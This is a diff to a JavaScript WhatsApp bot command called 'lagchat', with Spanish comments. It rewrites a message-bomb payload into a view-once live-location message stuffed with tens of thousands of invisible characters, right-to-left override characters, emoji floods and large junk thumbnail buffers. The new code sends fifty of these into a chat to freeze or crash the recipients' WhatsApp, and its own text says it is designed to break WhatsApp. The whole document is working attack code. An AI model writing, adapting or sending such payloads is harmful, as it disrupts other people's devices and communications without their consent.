@@ -1,43 +1,49 @@
 const buildLagMessage = () => ({
-  imageMessage: {
-    mimetype: 'image/jpeg',
-    caption: '\u2063'.repeat(40000) + '💀'.repeat(2000) + '\u202E'.repeat(1000), // invisible + RTL + emojis
-    jpegThumbnail: Buffer.alloc(1024 * 1024, 0), // 1MB basura
-    contextInfo: {
-      forwardingScore: 9999,
-      isForwarded: true,
-      mentionedJid: [],
-      externalAdReply: {
-        title: '💣 Mensaje Crítico',
-        body: 'Saturación total del sistema',
-        mediaType: 1,
-        thumbnail: Buffer.alloc(1024 * 1024, 1), // basura visual
-        renderLargerThumbnail: true,
-        showAdAttribution: true,
-        sourceUrl: 'https://wa.me/0'
+  viewOnceMessage: {
+    message: {
+      liveLocationMessage: {
+        degreesLatitude: '💣'.repeat(100) + '\u202E'.repeat(50), // emojis + unicode RTL
+        degreesLongitude: '💥'.repeat(100) + '\u202E'.repeat(50),
+        caption: '\u2063'.repeat(40000) + '💀'.repeat(3000), // spam invisible + emojis
+        sequenceNumber: '999999',
+        jpegThumbnail: Buffer.alloc(500000, 0), // medio MB de basura
+        contextInfo: {
+          forwardingScore: 9999,
+          isForwarded: true,
+          externalAdReply: {
+            title: '💣 LAGCHAT DESTRUCTOR 💥',
+            body: 'Este mensaje está diseñado para romper WhatsApp.',
+            mediaType: 1,
+            renderLargerThumbnail: true,
+            showAdAttribution: true,
+            sourceUrl: 'https://wa.me/0'
+          }
+        }
       }
     }
   }
 })
 
 let handler = async (m, { conn, isOwner }) => {
-  if (!isOwner) throw '⛔ Este comando es exclusivo del Owner.'
+  if (!isOwner) throw '⛔ Solo el Owner puede usar este comando.'
 
   const jid = m.chat
-  const times = 100 // ¡máximo abuso!
+  const times = 50
 
-  await m.reply('🚨 *MODO ULTRA OOGENT ACTIVADO* 🚨\n💥 Enviando spam masivo destructivo...\n❗ Esto puede cerrar WhatsApp al instante.')
+  await m.reply(`⚠️ Enviando ${times} bombas pesadas al chat...\n💥 Esto puede hacer que WhatsApp se congele o cierre.`)
 
   for (let i = 0; i < times; i++) {
     try {
-      // Enviar sin esperar (más rápido)
-      conn.sendMessage(jid, buildLagMessage(), { ephemeralExpiration: 0 })
+      await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
+      await new Promise(resolve => setTimeout(resolve, 100)) // menor delay = más presión
     } catch (error) {
-      console.error(`❌ Error en la bomba ${i + 1}:`, error)
+      console.error('❌ Error al enviar mensaje:', error)
+      await m.reply('❗ Fallo en la ejecución. El mensaje puede haber sido bloqueado.')
+      return
     }
   }
 
-  await m.reply('✅ *Ataque OOGENT completado.* ¿Todavía sigues vivo? 😈')
+  await m.reply('✅ *Lagchat destructivo completado.* ¿Sigue vivo tu WhatsApp? 😈')
 }
 
 handler.command = /^lagchat$/i
